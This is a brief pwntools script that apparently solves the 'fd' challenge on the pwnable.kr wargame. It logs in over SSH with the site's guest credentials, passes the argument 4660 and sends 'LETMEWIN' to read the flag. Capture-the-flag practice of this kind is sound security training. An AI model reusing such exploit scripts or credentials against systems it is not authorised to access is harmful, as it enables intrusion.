from pwn import ssh, log

buf_key = "4660\n"

r = ssh('fd', 'pwnable.kr', password='guest', port=2222)
p = r.process(executable='./fd', argv=['fd', buf_key])
p.sendline(b'LETMEWIN')
flag = p.recv()

log.success(b"Flag: " + flag)
p.close()
r.close()
